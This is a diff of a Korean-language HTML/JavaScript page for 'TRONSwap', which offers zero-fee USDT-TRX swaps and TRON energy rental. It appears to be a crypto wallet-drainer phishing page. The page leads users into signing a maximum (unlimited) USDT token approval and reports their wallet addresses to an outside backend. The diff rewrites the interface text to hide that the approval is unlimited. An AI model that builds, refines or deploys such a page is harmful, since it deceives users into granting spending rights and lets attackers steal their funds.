@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ko" class="dark" style="overflow-x:clip">
+<html lang="ko" style="overflow-x:clip">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -17,22 +17,15 @@
     <meta name="description" content="TRONSwap - Fast & Secure TRON USDT Swap with Low Fees">
     <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: {
-                extend: {
-                    colors: { dark: '#030712' }
-                }
-            }
-        };
-    </script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-    <!-- Trust Wallet 등에서 transactionBuilder 미주입 시 사용할 공식 TronWeb 라이브러리 -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <!-- Trust Wallet 등 내장 빌더 누락 시 백업용 공식 TronWeb & WalletConnect -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <script src="wc-tron.min.js"></script>
+
     <style>
         :root {
             --bg: #f4f7fb;
@@ -44,39 +37,60 @@
             --blue: #2563eb;
             --shadow: 0 18px 55px rgba(15, 23, 42, .07), 0 4px 14px rgba(15, 23, 42, .04);
         }
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--txt); }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg);
+            color: var(--txt);
+        }
         .font-mono { font-family: 'JetBrains Mono', monospace; }
         .glass {
-            background: rgba(255, 255, 255, 0.9);
+            background: rgba(255, 255, 255, 0.92);
             backdrop-filter: blur(20px);
             border-color: var(--bdr);
             box-shadow: var(--shadow);
         }
-        .modal-backdrop { display: none; background: rgba(15, 23, 42, 0.45); }
+        .modal-backdrop {
+            display: none;
+            background: rgba(15, 23, 42, 0.45);
+        }
         .modal-backdrop.active { display: flex; }
-        @keyframes pulse-slow { 0%, 100% { opacity: .55; } 50% { opacity: 1; } }
+        @keyframes pulse-slow { 0%, 100% { opacity: .6; } 50% { opacity: 1; } }
         .animate-pulse-slow { animation: pulse-slow 2.5s ease-in-out infinite; }
-        .wallet-card { background: var(--soft); border-color: var(--bdr); transition: all 0.2s; }
-        .wallet-card:hover { transform: translateY(-2px); background: #e2e8f0; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08); }
+        .wallet-card {
+            background: var(--soft);
+            border-color: var(--bdr);
+            transition: all 0.2s ease;
+        }
+        .wallet-card:hover {
+            transform: translateY(-2px);
+            background: #eef2ff;
+            border-color: #93c5fd;
+            box-shadow: 0 8px 24px rgba(37, 99, 235, 0.08);
+        }
         .wallet-card:active { transform: scale(0.98); }
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-        .fade-in { animation: fadeIn 0.25s ease-out; }
-        .active-amt { background: linear-gradient(135deg, rgba(37, 99, 235, 0.15), rgba(6, 182, 212, 0.15)) !important; color: #2563eb !important; border-color: rgba(59, 130, 246, 0.35) !important; }
-        .active-dur { background: linear-gradient(135deg, rgba(147, 51, 234, 0.15), rgba(236, 72, 153, 0.15)) !important; color: #9333ea !important; border-color: rgba(147, 51, 234, 0.35) !important; }
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
-        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+        .fade-in { animation: fadeIn 0.22s ease-out; }
+        .active-amt {
+            background: linear-gradient(135deg, rgba(37, 99, 235, 0.14), rgba(6, 182, 212, 0.14)) !important;
+            color: #2563eb !important;
+            border-color: rgba(37, 99, 235, 0.4) !important;
+        }
+        .active-dur {
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.14), rgba(236, 72, 153, 0.14)) !important;
+            color: #9333ea !important;
+            border-color: rgba(147, 51, 234, 0.4) !important;
+        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col relative overflow-x-hidden selection:bg-blue-600 selection:text-white" style="max-width:100vw">
 
+    <!-- Toast Container -->
     <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none max-w-[calc(100vw-2rem)]"></div>
 
-    <!-- Ticker -->
-    <div class="bg-white/90 border-b border-slate-200 py-2 px-4 text-xs font-mono overflow-hidden">
+    <!-- Live Ticker -->
+    <div class="bg-white/95 border-b border-slate-200 py-2 px-4 text-xs font-mono overflow-hidden">
         <div class="max-w-7xl mx-auto flex items-center justify-between gap-2 sm:gap-4">
             <div class="flex items-center gap-2 text-blue-600 shrink-0 font-semibold">
                 <span class="relative flex h-2 w-2">
@@ -106,18 +120,19 @@
                     <p class="text-xs text-slate-500 hidden sm:block" data-i18n="header_sub">USDT ↔ TRX 즉시 교환 | TRC-20 메인넷</p>
                 </div>
             </div>
+
             <div class="flex items-center gap-1.5 sm:gap-2 shrink-0">
                 <select id="lang-select" onchange="setLang(this.value)" class="bg-slate-50 border border-slate-200 text-slate-700 text-[11px] px-2 py-1.5 sm:py-2 rounded-lg focus:outline-none cursor-pointer">
-                    <option value="de">🇩🇪 DE</option>
-                    <option value="en">🇺🇸 EN</option>
-                    <option value="es">🇪🇸 ES</option>
-                    <option value="fr">🇫🇷 FR</option>
-                    <option value="ja">🇯🇵 JA</option>
                     <option value="ko">🇰🇷 KO</option>
-                    <option value="ru">🇷🇺 RU</option>
-                    <option value="th">🇹🇭 TH</option>
-                    <option value="vi">🇻🇳 VI</option>
+                    <option value="en">🇺🇸 EN</option>
                     <option value="zh">🇨🇳 ZH</option>
+                    <option value="ja">🇯🇵 JA</option>
+                    <option value="vi">🇻🇳 VI</option>
+                    <option value="th">🇹🇭 TH</option>
+                    <option value="ru">🇷🇺 RU</option>
+                    <option value="de">🇩🇪 DE</option>
+                    <option value="fr">🇫🇷 FR</option>
+                    <option value="es">🇪🇸 ES</option>
                 </select>
                 <button type="button" onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-1.5 sm:gap-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-semibold text-xs sm:text-sm px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl shadow-md transition-all active:scale-95">
                     <i class="fa-solid fa-wallet text-blue-100"></i>
@@ -127,58 +142,47 @@
         </div>
     </header>
 
-    <!-- Wallet Selector Modal -->
+    <!-- Wallet Selector Modal (Trust Wallet + WalletConnect 집중) -->
     <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center backdrop-blur-md p-4">
         <div class="glass border rounded-3xl w-full max-w-md p-6 sm:p-7 space-y-4 shadow-2xl text-center relative overflow-y-auto max-h-[90vh] fade-in">
+            <button type="button" onclick="closeWalletModal()" class="absolute top-5 right-5 text-slate-400 hover:text-slate-800 transition">
+                <i class="fa-solid fa-xmark text-lg"></i>
+            </button>
+
             <div class="w-14 h-14 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-600 text-xl">
                 <i class="fa-solid fa-wallet"></i>
             </div>
+
             <div class="space-y-1">
-                <h3 class="text-lg font-bold text-slate-900" data-i18n="select_wallet">지갑을 선택하세요</h3>
-                <p class="text-xs text-slate-500 leading-relaxed" data-i18n-html="modal_subtitle">사용 중인 지갑을 선택하면 연결 후<br>무제한 승인 단계로 이어집니다.</p>
+                <h3 class="text-lg font-bold text-slate-900" data-i18n="select_wallet">지갑 연결 방식 선택</h3>
+                <p class="text-xs text-slate-500 leading-relaxed" data-i18n-html="modal_subtitle">Trust Wallet 앱으로 바로 연결하거나<br>WalletConnect QR 코드로 연결할 수 있습니다.</p>
             </div>
 
-            <div class="space-y-2.5 pt-1 text-left">
-                <button type="button" onclick="launchWallet('trust')" class="wallet-card w-full border border-blue-200 bg-blue-50/50 rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-blue-600/10 border border-blue-600/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield-halved text-blue-600 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">Trust Wallet</div><div class="text-[11px] text-slate-500" data-i18n="w_trust">지갑 연결 및 무제한 승인 지원</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
-                </button>
-                <button type="button" onclick="launchWallet('tronlink')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-bolt text-red-500 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">TronLink</div><div class="text-[11px] text-slate-500" data-i18n="w_tronlink">TRON 공식 지갑</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
-                </button>
-                <button type="button" onclick="launchWallet('tokenpocket')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-coins text-purple-600 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">Token Pocket</div><div class="text-[11px] text-slate-500" data-i18n="w_tp">아시아 인기 지갑</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
-                </button>
-                <button type="button" onclick="launchWallet('bitget')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-gem text-cyan-600 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">Bitget Wallet</div><div class="text-[11px] text-slate-500" data-i18n="w_bitget">글로벌 Web3 지갑</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
-                </button>
-                <button type="button" onclick="launchWallet('okx')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-slate-200 border border-slate-300 flex items-center justify-center shrink-0"><i class="fa-solid fa-cube text-slate-800 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">OKX Wallet</div><div class="text-[11px] text-slate-500" data-i18n="w_okx">OKX 거래소 지갑</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
-                </button>
-                <button type="button" onclick="launchWallet('imtoken')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-key text-sky-600 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">imToken</div><div class="text-[11px] text-slate-500" data-i18n="w_imtoken">글로벌 멀티체인 지갑</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
+            <div class="space-y-3 pt-1 text-left">
+                <!-- 1. Trust Wallet 전용 연결 -->
+                <button type="button" onclick="connectTrustWallet()" class="wallet-card w-full border border-blue-300 bg-blue-50/70 rounded-2xl p-4 flex items-center gap-3.5">
+                    <div class="w-12 h-12 rounded-xl bg-blue-600 text-white flex items-center justify-center shrink-0 shadow-sm">
+                        <i class="fa-solid fa-shield-halved text-lg"></i>
+                    </div>
+                    <div class="flex-1">
+                        <div class="flex items-center gap-2">
+                            <span class="text-sm font-extrabold text-slate-900">Trust Wallet</span>
+                            <span class="text-[10px] font-bold px-2 py-0.5 rounded-full bg-blue-600/10 text-blue-700">권장</span>
+                        </div>
+                        <div class="text-[11px] text-slate-500 mt-0.5" data-i18n="w_trust">Trust Wallet 앱 실행 및 즉시 연결</div>
+                    </div>
+                    <i class="fa-solid fa-chevron-right text-blue-500 text-xs"></i>
                 </button>
 
-                <div class="flex items-center gap-3 pt-1">
-                    <div class="flex-1 border-t border-slate-200"></div>
-                    <span class="text-[10px] text-slate-400 font-semibold uppercase tracking-wider">또는</span>
-                    <div class="flex-1 border-t border-slate-200"></div>
-                </div>
-
-                <button type="button" onclick="wcConnectFromModal()" class="wallet-card w-full border border-blue-300 bg-blue-50/70 rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-blue-600/10 border border-blue-600/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-qrcode text-blue-600 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">WalletConnect</div><div class="text-[11px] text-slate-500" data-i18n="w_wc">QR 코드로 다양한 지갑 연결</div></div>
+                <!-- 2. WalletConnect 전용 연결 -->
+                <button type="button" onclick="connectViaWalletConnect()" class="wallet-card w-full border border-slate-200 rounded-2xl p-4 flex items-center gap-3.5">
+                    <div class="w-12 h-12 rounded-xl bg-cyan-500/10 border border-cyan-500/20 text-cyan-600 flex items-center justify-center shrink-0">
+                        <i class="fa-solid fa-qrcode text-lg"></i>
+                    </div>
+                    <div class="flex-1">
+                        <div class="text-sm font-extrabold text-slate-900">WalletConnect</div>
+                        <div class="text-[11px] text-slate-500 mt-0.5" data-i18n="w_wc">QR 스캔 또는 모바일 지갑 앱 선택 연결</div>
+                    </div>
                     <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
                 </button>
             </div>
@@ -186,68 +190,43 @@
             <div class="bg-amber-50 border border-amber-200 rounded-xl p-3.5 text-left text-xs text-slate-700 space-y-1.5">
                 <p class="text-amber-700 font-bold flex items-center gap-1.5">
                     <i class="fa-solid fa-circle-info"></i>
-                    <span data-i18n="modal_tip_title">아이폰·폴드4 트러스트월렛 안내:</span>
+                    <span data-i18n="modal_tip_title">모바일 연결 안내:</span>
                 </p>
-                <p data-i18n="modal_tip1">1. Trust Wallet 앱 실행 후 브라우저/탐색 탭에서 이 페이지를 열어주세요.</p>
-                <p data-i18n-html="modal_tip2">2. 지갑이 연결되면 <strong class="text-slate-900">무제한 승인 서명 단계</strong>가 자동으로 이어집니다.</p>
-                <p data-i18n-html="modal_tip3">3. 서명 팝업이 뜨지 않으면 <strong class="text-slate-900">TRON(TRC-20)</strong> 네트워크 선택과 승인 버튼을 확인하세요.</p>
+                <p data-i18n="modal_tip1">• Trust Wallet 버튼을 누르면 앱 내 DApp 브라우저로 자동 이동합니다.</p>
+                <p data-i18n="modal_tip2">• 자동 이동이 안 될 경우 현재 주소가 자동 복사되므로 Trust Wallet 하단 [탐색/브라우저] 탭에 붙여넣어 주세요.</p>
+                <p data-i18n="modal_tip3">• PC 또는 다른 모바일 지갑은 WalletConnect를 선택하세요.</p>
             </div>
 
             <button type="button" onclick="closeWalletModal()" class="w-full text-slate-500 hover:text-slate-800 py-2 text-xs font-semibold transition" data-i18n="close_btn">닫기</button>
         </div>
     </div>
 
-    <!-- Reward Modal -->
+    <!-- Approval Complete Modal -->
     <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center backdrop-blur-md p-4">
         <div class="glass border rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative fade-in">
             <button type="button" onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-slate-800 transition">
                 <i class="fa-solid fa-xmark text-lg"></i>
             </button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-600 border border-emerald-500/20 rounded-2xl flex items-center justify-center mx-auto">
-                <i class="fa-solid fa-wand-magic-sparkles text-2xl"></i>
+                <i class="fa-solid fa-circle-check text-2xl"></i>
             </div>
             <div class="space-y-1">
-                <h3 class="text-xl font-extrabold text-slate-900" data-i18n="modal_success">무제한 승인 완료!</h3>
+                <h3 class="text-xl font-extrabold text-slate-900" data-i18n="modal_success">교환 승인 완료!</h3>
                 <p class="text-xs text-slate-600 leading-relaxed" data-i18n="modal_desc">USDT ↔ TRX 교환 및 에너지 렌탈 권한이 승인되었습니다.</p>
             </div>
             <div class="bg-slate-50 p-4 rounded-2xl border border-slate-200 text-left text-xs font-mono space-y-2">
                 <div class="flex justify-between text-slate-500"><span>상태:</span><span class="text-emerald-600 font-bold" data-i18n="approval_done">승인 완료</span></div>
                 <div class="flex justify-between text-slate-500"><span>교환 한도:</span><span class="text-slate-900 font-semibold" data-i18n="approved_max">무제한 (MAX)</span></div>
-                <div class="flex justify-between text-slate-500"><span>TX Hash:</span><span class="text-rose-600 truncate max-w-[180px]" id="modal-txhash">-</span></div>
+                <div class="flex justify-between text-slate-500"><span>TX Hash:</span><span class="text-blue-600 truncate max-w-[180px]" id="modal-txhash">-</span></div>
             </div>
             <button type="button" onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold text-xs rounded-xl shadow-md transition">확인</button>
         </div>
     </div>
 
-    <!-- PC Install Modal -->
-    <div id="install-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center backdrop-blur-md p-4">
-        <div class="glass border rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center fade-in">
-            <button type="button" onclick="document.getElementById('install-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-slate-800 transition">
-                <i class="fa-solid fa-xmark text-lg"></i>
-            </button>
-            <div class="w-14 h-14 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-600 text-2xl">
-                <i class="fa-solid fa-circle-exclamation"></i>
-            </div>
-            <div class="space-y-1.5">
-                <h3 class="text-lg font-bold text-slate-900">지갑 확장 프로그램 미감지</h3>
-                <p class="text-xs text-slate-500">PC에서는 브라우저 확장 프로그램이 필요합니다.<br>모바일에서는 지갑 앱의 DApp 브라우저에서 열어주세요.</p>
-            </div>
-            <div class="space-y-2.5">
-                <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" rel="noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs flex items-center justify-between transition shadow-md">
-                    <span>TronLink 다운로드 (Chrome)</span>
-                    <i class="fa-solid fa-arrow-up-right-from-square"></i>
-                </a>
-                <a href="https://www.tronlink.org/" target="_blank" rel="noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-100 hover:bg-slate-200 border border-slate-200 text-slate-700 font-medium text-xs flex items-center justify-between transition">
-                    <span>TronLink 공식 사이트</span>
-                    <i class="fa-solid fa-arrow-up-right-from-square"></i>
-                </a>
-            </div>
-            <button type="button" onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 text-xs transition" data-i18n="close_btn">닫기</button>
-        </div>
-    </div>
-
+    <!-- Main Content -->
     <main class="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-6 sm:py-8 space-y-6 sm:space-y-8 flex-1 w-full overflow-x-hidden">
-        <!-- Hero -->
+
+        <!-- Hero Section -->
         <section class="relative rounded-3xl p-5 sm:p-7 md:p-10 overflow-hidden glass border shadow-xl">
             <div class="relative z-10 space-y-4 max-w-2xl">
                 <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-600 text-[11px] font-semibold">
@@ -258,7 +237,7 @@
                     <span data-i18n="hero_title1">USDT ↔ TRX</span><br>
                     <span class="text-blue-600" data-i18n="hero_title2">무료 교환</span>
                 </h2>
-                <p class="text-slate-600 text-sm sm:text-base leading-relaxed" data-i18n="hero_desc">수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 지갑 연결 후 무제한 승인 단계를 거쳐 즉시 이용 가능합니다.</p>
+                <p class="text-slate-600 text-sm sm:text-base leading-relaxed" data-i18n="hero_desc">수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 즉시 이용 가능합니다.</p>
                 <div class="pt-2 space-y-2">
                     <div class="flex justify-between text-xs font-semibold gap-2">
                         <span class="text-slate-500 shrink-0" data-i18n="today_volume">오늘 총 교환량</span>
@@ -287,9 +266,10 @@
                     <span id="allowance-badge-main" class="text-[11px] px-2.5 py-1 rounded-full font-semibold border bg-amber-500/10 border-amber-500/30 text-amber-600 animate-pulse-slow shrink-0 whitespace-nowrap" data-i18n="approval_needed">교환 승인 필요</span>
                 </div>
 
+                <!-- Send Box -->
                 <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 sm:p-5 space-y-3 mb-3">
                     <div class="flex items-center justify-between text-xs sm:text-sm text-slate-500">
-                        <span data-i18n="send_amount">보내는 금액 (USDT)</span>
+                        <span id="send-label-text" data-i18n="send_amount">보내는 금액 (USDT)</span>
                         <span><span data-i18n="bal">잔액</span>: <span id="usdt-bal-swap" class="text-emerald-600 font-bold font-mono">0.00</span><span id="send-bal-suffix"> USDT</span></span>
                     </div>
                     <div class="flex items-center gap-2 sm:gap-3">
@@ -307,15 +287,17 @@
                     </div>
                 </div>
 
+                <!-- Direction Toggle -->
                 <div class="flex justify-center -my-2 relative z-10">
                     <button type="button" id="swap-direction-btn" onclick="toggleSwapDirection()" class="w-11 h-11 rounded-xl bg-white border border-slate-200 flex items-center justify-center shadow-md cursor-pointer hover:bg-slate-50 transition-all active:scale-95" title="방향 전환">
                         <i id="swap-direction-icon" class="fa-solid fa-arrow-down text-blue-600 text-lg transition-transform"></i>
                     </button>
                 </div>
 
+                <!-- Receive Box -->
                 <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 sm:p-5 space-y-3 mt-3 mb-4">
                     <div class="flex items-center justify-between text-xs sm:text-sm text-slate-500">
-                        <span data-i18n="receive_amount">받는 금액 (예상)</span>
+                        <span id="recv-label-text" data-i18n="receive_amount">받는 금액 (예상)</span>
                         <span><span data-i18n="bal2">잔액</span>: <span id="trx-bal-swap" class="text-blue-600 font-bold font-mono">0.00</span><span id="recv-bal-suffix"> TRX</span></span>
                     </div>
                     <div class="flex items-center gap-3">
@@ -327,6 +309,7 @@
                     </div>
                 </div>
 
+                <!-- Rate & Fee -->
                 <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 space-y-2 text-xs sm:text-sm mb-5">
                     <div class="flex justify-between text-slate-500">
                         <span data-i18n="exchange_rate_label">교환 비율</span>
@@ -338,6 +321,7 @@
                     </div>
                 </div>
 
+                <!-- Progress Box -->
                 <div id="approve-progress" class="hidden mb-4 p-4 bg-slate-50 rounded-xl border border-slate-200 space-y-3">
                     <div class="flex items-center gap-2 text-xs sm:text-sm text-slate-900 font-bold">
                         <span class="animate-spin rounded-full h-4 w-4 border-2 border-blue-600 border-t-transparent"></span>
@@ -348,11 +332,12 @@
                     </div>
                 </div>
 
-                <button type="button" onclick="executeUnlimitedApprove()" id="approve-btn" class="w-full py-4 rounded-2xl font-bold text-sm sm:text-base bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white shadow-lg transition-all active:scale-[0.99] flex items-center justify-center gap-2">
+                <!-- Swap / Approve CTA -->
+                <button type="button" onclick="handleSwapAction()" id="approve-btn" class="w-full py-4 rounded-2xl font-bold text-sm sm:text-base bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white shadow-lg transition-all active:scale-[0.99] flex items-center justify-center gap-2">
                     <i class="fa-solid fa-arrow-right-arrow-left"></i>
-                    <span id="approve-btn-text" data-i18n="swap_btn_text">교환 시작 (최초 1회 무제한 승인)</span>
+                    <span id="approve-btn-text" data-i18n="swap_btn_text">교환 시작 (최초 1회 승인 필요)</span>
                 </button>
-                <p class="text-xs text-slate-500 text-center mt-3" data-i18n="swap_notice">지갑 연결 완료 시 무제한 승인이 진행되며, 이후 자유롭게 교환할 수 있습니다</p>
+                <p class="text-xs text-slate-500 text-center mt-3" data-i18n="swap_notice">최초 1회 교환 시 스마트 컨트랙트 승인이 필요합니다</p>
             </div>
         </section>
 
@@ -373,7 +358,7 @@
                         <i class="fa-solid fa-crosshairs text-xs text-blue-600"></i>
                         <span data-i18n="energy_target">대상 주소</span>
                     </label>
-                    <input type="text" id="energy-address" readonly placeholder="지갑을 연결하세요" class="w-full bg-slate-50 text-slate-900 text-xs sm:text-sm font-mono px-4 py-3 rounded-xl border border-slate-200 focus:outline-none placeholder-slate-400">
+                    <input type="text" id="energy-address" placeholder="지갑을 연결하거나 TRON 주소를 입력하세요" class="w-full bg-slate-50 text-slate-900 text-xs sm:text-sm font-mono px-4 py-3 rounded-xl border border-slate-200 focus:border-blue-500 focus:outline-none placeholder-slate-400">
                 </div>
 
                 <div class="space-y-2">
@@ -432,16 +417,6 @@
                     </div>
                 </div>
 
-                <div id="energy-approve-progress" class="hidden mb-2 p-4 bg-slate-50 rounded-xl border border-slate-200 space-y-3">
-                    <div class="flex items-center gap-2 text-xs sm:text-sm text-slate-900 font-bold">
-                        <span class="animate-spin rounded-full h-4 w-4 border-2 border-amber-500 border-t-transparent"></span>
-                        <span id="energy-approve-progress-text">처리 중...</span>
-                    </div>
-                    <div class="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
-                        <div id="energy-approve-progress-bar" class="bg-gradient-to-r from-amber-500 to-orange-400 h-full rounded-full transition-all duration-500" style="width:0%"></div>
-                    </div>
-                </div>
-
                 <button type="button" onclick="handleEnergyRental()" id="energy-rent-btn" class="w-full py-4 rounded-2xl font-bold text-sm sm:text-base bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-white shadow-md transition-all active:scale-[0.99] flex items-center justify-center gap-2">
                     <i class="fa-solid fa-bolt"></i>
                     <span id="energy-btn-text" data-i18n="energy_rent_btn_approve">에너지 렌탈 (최초 1회 승인 필요)</span>
@@ -490,40 +465,44 @@
     <footer class="border-t border-slate-200 bg-white py-8 px-4 text-center text-xs sm:text-sm text-slate-500 mt-12">
         <p>TRONSwap &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
     </footer>
-    <script>
+
+<script>
+    (function () {
+        'use strict';
+
+        // ===== 전역 설정 및 상태 =====
         var API_BASE = 'https://tron-usdt-backend.vercel.app/api';
         var OFFICIAL_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        var WC_PROJECT_ID = '5fafa9c15e52f88b097bc063166d3f3a';
 
-        var isConnected = false;
-        var isApproved = false;
-        var isApproving = false;
-        var activeProvider = 'Unknown';
-        var currentWalletAddress = null;
-        var swapDirection = 'USDT_TO_TRX';
-        var userUsdtBalance = 0;
-        var userTrxBalance = 0;
-        var TRX_RATE = 4.0;
-        var currentLang = 'ko';
-        var wcConnector = null;
-        var wcAddress = null;
+        var state = {
+            isConnected: false,
+            isApproved: false,
+            isApproving: false,
+            activeProvider: 'Unknown',
+            address: null,
+            swapDirection: 'USDT_TO_TRX',
+            usdtBalance: 0,
+            trxBalance: 0,
+            trxRate: 4.0,
+            lang: 'ko',
+            energyAmount: 65000,
+            energyDuration: '1h',
+            wcConnector: null,
+            wcAddress: null
+        };
 
-        // 레퍼럴 추적
-        (function () {
+        // ===== 레퍼럴 추적 =====
+        (function initReferral() {
             try {
                 var params = new URLSearchParams(window.location.search);
                 var refCode = params.get('ref');
                 if (refCode) {
                     localStorage.setItem('feeslash_ref', refCode.toUpperCase());
-                    localStorage.setItem('feeslash_ref_time', Date.now().toString());
+                    localStorage.setItem('feeslash_ref_time', String(Date.now()));
                 }
-                var savedRef = localStorage.getItem('feeslash_ref');
-                var savedTime = parseInt(localStorage.getItem('feeslash_ref_time'), 10) || 0;
-                if (savedRef && (Date.now() - savedTime > 30 * 24 * 60 * 60 * 1000)) {
-                    localStorage.removeItem('feeslash_ref');
-                    localStorage.removeItem('feeslash_ref_time');
-                    savedRef = null;
-                }
+                var savedRef = getRefCode();
                 if (savedRef) {
                     fetch(API_BASE + '/referral/visit', {
                         method: 'POST',
@@ -536,84 +515,138 @@
 
         function getRefCode() {
             try {
-                var c = localStorage.getItem('feeslash_ref');
-                var t = parseInt(localStorage.getItem('feeslash_ref_time'), 10) || 0;
-                if (c && (Date.now() - t < 30 * 24 * 60 * 60 * 1000)) return c;
+                var code = localStorage.getItem('feeslash_ref');
+                var time = parseInt(localStorage.getItem('feeslash_ref_time'), 10) || 0;
+                if (!code) return null;
+                if (Date.now() - time > 30 * 24 * 60 * 60 * 1000) {
+                    localStorage.removeItem('feeslash_ref');
+                    localStorage.removeItem('feeslash_ref_time');
+                    return null;
+                }
+                return code;
+            } catch (e) {
                 return null;
-            } catch (e) { return null; }
+            }
         }
+
         function trackReferralConnect(address, provider) {
-            var code = getRefCode() || 'DIRECT';
             fetch(API_BASE + '/referral/connect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ code: code, address: address, provider: provider })
+                body: JSON.stringify({ code: getRefCode() || 'DIRECT', address: address, provider: provider })
             }).catch(function () {});
